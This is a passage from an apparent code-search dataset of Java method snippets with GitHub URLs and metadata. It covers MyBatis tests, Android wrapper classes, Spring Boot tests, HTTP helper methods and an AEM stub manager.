"return_type": "void", "snippet": "\tpublic void onScrolled (android.support.v7.widget.RecyclerView p0, int p1, int p2)\t{\t\tn_onScrolled (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollHelper.java", "stars": "2", "class": {"name": "ScrollHelper", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onScrolled", "params": ["android", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onScrolled (android.support.v7.widget.RecyclerView p0, int p1, int p2);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollHelper.java", "stars": "2", "class": {"name": "ScrollHelper", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollHelper.java", "stars": "2", "class": {"name": "ScrollHelper", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollHelper.java", "stars": "2", "class": {"name": "ScrollHelper", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_detailed_record);        ButterKnife.bind(this);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/otc/DetailedRecordActivity.java", "stars": "1", "class": {"name": "DetailedRecordActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldSetParameter", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {    TYPE_HANDLER.setParameter(ps, 1, DATE, null);    verify(ps).setTime(1, SQL_TIME);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {    when(rs.getTime(\"column\")).thenReturn(SQL_TIME);    assertEquals(DATE, TYPE_HANDLER.getResult(rs, \"column\"));    verify(rs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {    when(rs.getTime(\"column\")).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));    verify(rs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {    when(rs.getTime(1)).thenReturn(SQL_TIME);    assertEquals(DATE, TYPE_HANDLER.getResult(rs, 1));    verify(rs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {    when(rs.getTime(1)).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(rs, 1));    verify(rs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {    when(cs.getTime(1)).thenReturn(SQL_TIME);    assertEquals(DATE, TYPE_HANDLER.getResult(cs, 1));    verify(cs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {    when(cs.getTime(1)).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(cs, 1));    verify(cs, never()).wasNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/TimeOnlyTypeHandlerTest.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "skipAll", "params": ["InputStream"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void skipAll(InputStream input) throws IOException {        // Read into a buffer to reduce method invocation overhead.        //        // Don't use skip() because it's not supported by        // Android's current HttpURLConnection implementation.        // Even if skip() was supported, the implementation would        // probably allocate a buffer internally anyway.        //        // It is important to allocate a new buffer for each invocation        // because this ContentHandler may be used by multiple threads,        // and HttpURLConnection may read from the buffer when writing        // to the ResponseCache.        byte[] buffer = new byte[BUFFER_SIZE];        while (-1 != input.read(buffer)) {        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/SinkContentHandler.java", "stars": "74", "class": {"name": "SinkContentHandler", "extends": "ContentHandler", "implements": null, "modifiers": []}}, {"method_name": "getVia", "params": ["URLConnection"], "throws": null, "modifiers": ["private", "static"], "return_type": "List<String>", "snippet": "    private static List<String> getVia(URLConnection connection) {        Map<String, List<String>> headerFields = connection.getHeaderFields();        List<String> via = headerFields.get(\"via\");        if (via == null) {            via = Collections.emptyList();        }        return via;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/SinkContentHandler.java", "stars": "74", "class": {"name": "SinkContentHandler", "extends": "ContentHandler", "implements": null, "modifiers": []}}, {"method_name": "isViaLocalhost", "params": ["URLConnection"], "throws": null, "modifiers": ["static"], "return_type": "boolean", "snippet": "    static boolean isViaLocalhost(URLConnection connection) {        List<String> via = getVia(connection);        return via.contains(\"1.0 localhost\") || via.contains(\"1.1 localhost\");    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/SinkContentHandler.java", "stars": "74", "class": {"name": "SinkContentHandler", "extends": "ContentHandler", "implements": null, "modifiers": []}}, {"method_name": "getContent", "params": ["URLConnection"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Void", "snippet": "    public Void getContent(URLConnection connection) throws IOException {        InputStream input = connection.getInputStream();        if (isViaLocalhost(connection)) {            // The content is already cached locally            input.close();            return null;        } else {            // Read the InputStream fully to populate the ResponseCache            try {                skipAll(input);            } finally {                input.close();            }            return null;        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/SinkContentHandler.java", "stars": "74", "class": {"name": "SinkContentHandler", "extends": "ContentHandler", "implements": null, "modifiers": []}}, {"method_name": "RetrieveRepository", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Infrastructure", "snippet": "    public Infrastructure.IPersonRepository RetrieveRepository() {        switch (_typeOfRepository) {            case \"Memory\":                return new Infrastructure.MemoryPersonRepository();            case \"Json\":                return new Infrastructure.JsonPersonRepository();            default:                new Exception(\"Invalid Repository\").printStackTrace();        }        return null;    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Factories/PersonRepositoryFactory.java", "stars": "2", "class": {"name": "PersonRepositoryFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CrackedSettsBlock.java", "stars": "2", "class": {"name": "CrackedSettsBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CrackedSettsBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "detectWebApplicationTypeToNone", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid detectWebApplicationTypeToNone() {\t\tSpringApplication application = new SpringApplication(ExampleConfig.class);\t\tassertThat(application.getWebApplicationType()).isEqualTo(WebApplicationType.NONE);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/SpringApplicationNoWebTests.java", "stars": "47572", "class": {"name": "SpringApplicationNoWebTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "specificApplicationContextClass", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid specificApplicationContextClass() {\t\tSpringApplication application = new SpringApplication(ExampleConfig.class);\t\tapplication.setApplicationContextClass(StaticApplicationContext.class);\t\tConfigurableApplicationContext context = application.run();\t\tassertThat(context).isInstanceOf(StaticApplicationContext.class);\t\tcontext.close();\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/SpringApplicationNoWebTests.java", "stars": "47572", "class": {"name": "SpringApplicationNoWebTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "press", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void press(ComponentStatus status) {        if (status.getStatus() == ComponentStatus.STATUS_UNUSED) {            return ;        }        int index = status.getIndex();        if (index < buttons.length && buttons[index] != null) {            buttons[index].setBackground(Color.ORANGE);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/ButtonDialogKeyProcessor.java", "stars": "4", "class": {"name": "ButtonDialogKeyProcessor", "extends": "ButtonKeyProcessor", "implements": null, "modifiers": ["public"]}}, {"method_name": "release", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release(ComponentStatus status) {        if (status.getStatus() == ComponentStatus.STATUS_UNUSED) {            return ;        }        int index = status.getIndex();        if (index < buttons.length && buttons[index] != null) {            buttons[index].setBackground(Color.LIGHT_GRAY);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/ButtonDialogKeyProcessor.java", "stars": "4", "class": {"name": "ButtonDialogKeyProcessor", "extends": "ButtonKeyProcessor", "implements": null, "modifiers": ["public"]}}, {"method_name": "sendGet", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String sendGet(String url,Map<String,String> headers) {        String result = \"\";        BufferedReader in = null;        try {            String urlNameString = url;            URL realUrl = new URL(urlNameString);            URLConnection conn = realUrl.openConnection();            Set<Entry<String, String>> set=headers.entrySet();\t\t\tfor(Entry<String,String> header:set) {\t\t\t\tconn.setRequestProperty(header.getKey(), header.getValue());\t\t\t}            conn.connect();            in = new BufferedReader(new InputStreamReader(                    conn.getInputStream(),\"utf-8\"));            String line;            while ((line = in.readLine()) != null) {                result += line;            }        } catch (Exception e) {            System.out.println(\"\u53d1\u9001GET\u8bf7\u6c42\u51fa\u73b0\u5f02\u5e38\uff01\" + e);            e.printStackTrace();        }        finally {            try {                if (in != null) {                    in.close();                }            } catch (Exception e2) {                e2.printStackTrace();            }        }        return result;    }", "url": "https://raw.githubusercontent.com/meethigher/cpdaily-submit/master/HttpUtil.java", "stars": "2", "class": {"name": "HttpUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendPost", "params": ["String", "String", "Map<String,String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String sendPost(String url, String param,Map<String,String> headers) {\t\tBufferedWriter out = null;\t\tBufferedReader in = null;\t\tString result = \"\";\t\ttry {\t\t\tURL realUrl = new URL(url);\t\t\tURLConnection conn = realUrl.openConnection();\t\t\tSet<Entry<String, String>> set=headers.entrySet();\t\t\tfor(Entry<String,String> header:set) {\t\t\t\tconn.setRequestProperty(header.getKey(), header.getValue());\t\t\t}\t\t\tconn.setDoOutput(true);\t\t\tconn.setDoInput(true);\t\t\tout = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), \"utf-8\"));\t\t\tout.write(param);\t\t\tout.flush();\t\t\tin = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"utf-8\"));\t\t\tString line;\t\t\twhile ((line = in.readLine()) != null) {\t\t\t\tresult += line;\t\t\t}\t\t} catch (Exception e) {\t\t\tSystem.out.println(\"\u53d1\u9001 POST \u8bf7\u6c42\u51fa\u73b0\u5f02\u5e38\uff01\" + e);\t\t\te.printStackTrace();\t\t} finally {\t\t\ttry {\t\t\t\tif (out != null) {\t\t\t\t\tout.close();\t\t\t\t}\t\t\t\tif (in != null) {\t\t\t\t\tin.close();\t\t\t\t}\t\t\t} catch (IOException ex) {\t\t\t\tex.printStackTrace();\t\t\t}\t\t}\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/meethigher/cpdaily-submit/master/HttpUtil.java", "stars": "2", "class": {"name": "HttpUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "invalidate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void invalidate ()\t{\t\tn_invalidate ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_invalidate", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_invalidate ();\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onFocusChange (android.view.View p0, boolean p1);\tpublic void onCheckedChanged (android.widget.CompoundButton p0, boolean p1)\t{\t\tn_onCheckedChanged (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onCheckedChanged", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCheckedChanged (android.widget.CompoundButton p0, boolean p1)\t{\t\tn_onCheckedChanged (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onCheckedChanged", "params": ["android", "boolean"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onCheckedChanged (android.widget.CompoundButton p0, boolean p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxRendererBase.java", "stars": "2", "class": {"name": "CheckBoxRendererBase", "extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"method_name": "initDatabase", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void initDatabase() throws Exception {    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/cglib_lazy_error/ibatisConfig.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/cglib_lazy_error/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNoParent", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testNoParent() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person person = personMapper.selectById(1);      Assertions.assertNotNull(person, \"Persons must not be null\");      Person parent = person.getParent();      Assertions.assertNull(parent, \"Parent must be null\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testAncestorSelf", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAncestorSelf() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person person = personMapper.selectById(1);      Assertions.assertNotNull(person, \"Persons must not be null\");      Person ancestor = person.getAncestor();      Assertions.assertEquals(person, ancestor, \"Ancestor must be John Smith sr.\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testGrandParent", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testGrandParent() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person expectedParent = personMapper.selectById(2);      Person expectedGrandParent = personMapper.selectById(1);      Person person = personMapper.selectById(3);      Assertions.assertNotNull(person, \"Persons must not be null\");      Assertions.assertEquals(expectedParent, person.getParent(), \"Parent must be John Smith\");      Assertions.assertEquals(expectedGrandParent, person.getParent().getParent(), \"Parent must be John Smith sr.\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testAncestor", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAncestor() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person expectedAncestor = personMapper.selectById(1);      Person person = personMapper.selectById(3);      Assertions.assertNotNull(person, \"Persons must not be null\");      Assertions.assertEquals(expectedAncestor, person.getAncestor(), \"Ancestor must be John Smith sr.\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testAncestorAfterQueryingParents", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAncestorAfterQueryingParents() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person expectedAncestor = personMapper.selectById(1);      Person person = personMapper.selectById(3);      // Load ancestor indirectly.      Assertions.assertNotNull(person, \"Persons must not be null\");      Assertions.assertNotNull(person.getParent(), \"Parent must not be null\");      Assertions.assertNotNull(person.getParent().getParent(), \"Grandparent must not be null\");      Assertions.assertEquals(expectedAncestor, person.getAncestor(), \"Ancestor must be John Smith sr.\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsertBetweenTwoSelects", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertBetweenTwoSelects() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()){      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person selected1 = personMapper.selectById(1);      Person selected2 = personMapper.selectById(2);      Person selected3 = personMapper.selectById(3);      selected1.setId(4L);      int rows = personMapper.insertPerson(selected1);      Assertions.assertEquals(1, rows);      selected1 = personMapper.selectById(1);      selected2 = personMapper.selectById(2);      selected3 = personMapper.selectById(3);      Person selected4 = personMapper.selectById(4);      Assertions.assertEquals(1, selected1.getId().longValue());      Assertions.assertEquals(2, selected2.getId().longValue());      Assertions.assertEquals(3, selected3.getId().longValue());      Assertions.assertEquals(4, selected4.getId().longValue());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testSelectWithStringSQLInjection", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSelectWithStringSQLInjection() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);      Person selected1 = personMapper.selectByStringId(\"1\");      Assertions.assertEquals(1, selected1.getId().longValue());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cglib_lazy_error/CglibNPETest.java", "stars": "15", "class": {"name": "CglibNPETest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "reload", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void reload() {    runnables.forEach(this::reload);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "reload", "params": ["Stubs<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void reload(Stubs<?> runnable) {    StubReload reload = new StubReload();    runnable.initServer();    mapAll(reload, runnable);    runAll(reload, runnable);    runnable.startServer();    LOG.info(reload.summary());  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "runAll", "params": ["StubReload", "Stubs<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void runAll(StubReload reload, Stubs<?> runnable) {    final String rootPath = format(\"%s/%s\", getRootPath(), runnable.getId());    LOG.info(\"Running AEM Stubs scripts with extension '{}' under path '{}'\", config.scriptExtension(), rootPath);    resolverAccessor.consume(resolver -> {      try {        runAllUnderPath(reload, rootPath, resolver, runnable);      } catch (Exception e) {        LOG.error(\"Cannot run AEM Stubs scripts! Cause: {}\", e.getMessage(), e);      }    });  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "runAllUnderPath", "params": ["StubReload", "String", "ResourceResolver", "Stubs<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void runAllUnderPath(StubReload reload, String rootPath, ResourceResolver resolver, Stubs<?> runnable) {    final AbstractResourceVisitor visitor = new AbstractResourceVisitor() {      @Override      protected void visit(Resource resource) {        if (resource.isResourceType(JcrUtils.NT_FILE) && isScript(resource.getPath())) {          try {            reload.scriptsTotal++;            runnable.runScript(resource);          } catch (Exception e) {            reload.scriptsFailed++;            LOG.error(\"Cannot execute AEM Stubs script at path '{}'!\", resource.getPath(), e);          }        }      }    };    visitor.accept(resolver.getResource(rootPath));  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "findRunnable", "params": ["String"], "throws": null, "modifiers": ["public"], 